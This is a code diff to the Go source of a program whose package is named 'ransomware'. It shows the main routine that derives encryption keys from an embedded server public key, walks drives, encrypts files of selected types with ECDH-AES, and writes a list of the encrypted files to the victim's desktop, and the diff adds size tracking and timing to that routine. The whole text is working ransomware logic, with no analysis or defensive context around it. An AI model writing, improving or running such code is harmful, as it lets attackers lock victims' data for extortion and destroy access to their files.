@@ -15,10 +15,11 @@ import (
 	"ransomware/io"
 	"ransomware/utils"
 	"sync"
+	"time"
 )
 
 var (
-	encryptedList []string
+	encryptedList []utils.FileInfo
 	waitGroup     sync.WaitGroup
 	sPubKey       = rsaLib.DecodeRSAPublicKey(utils.SPubKeyPem)
 )
@@ -26,6 +27,7 @@ var (
 func main() {
 
 	var currentUser *user.User
+	startTime := time.Now()
 
 	clientPubKeys, err := generateClientKeys(sPubKey)
 	if err != nil {
@@ -49,7 +51,7 @@ func main() {
 		encryptFiles(drive, clientPubKeys)
 	}
 
-	defer generateDesktopFiles()
+	defer utils.GenerateDesktopFiles(encryptedList, startTime)
 }
 
 func generateClientKeys(servPubKey *rsa.PublicKey) ([]*ecdsa.PublicKey, error) {
@@ -144,13 +146,16 @@ func encryptFiles(dirPath string, pubKeys []*ecdsa.PublicKey) {
 	waitGroup.Add(1)
 	go func() {
 		for file := range filesToVisit {
-
 			fileType, mapContains := utils.FileType[file.Extension]
 
 			if mapContains {
 				err = io.EncryptFile(&file, encryption.ECDHAESEncrypt, pubKeys[fileType])
+
 				if err == nil {
-					encryptedList = append(encryptedList, file.Path)
+					encryptedList = append(encryptedList, utils.FileInfo{
+						Path: file.Path, Size: int(file.Info.Size())})
+				} else {
+					fmt.Println(err)
 				}
 
 			}
@@ -160,24 +165,4 @@ func encryptFiles(dirPath string, pubKeys []*ecdsa.PublicKey) {
 	}()
 
 	waitGroup.Wait()
-}
-
-func generateDesktopFiles() error {
-
-	var text string = "------ENCRYPTED FILES------\n\n"
-	desktopPath, err := utils.GetDesktopPath()
-	if err != nil {
-		return err
-	}
-
-	for _, filePath := range encryptedList {
-		text = text + filePath + "\n"
-	}
-	bytes := []byte(text)
-	err = os.WriteFile(desktopPath+"/ENCRYPTED_FILES.txt", bytes, 0644)
-	if err != nil {
-		return err
-	}
-
-	return nil
 }
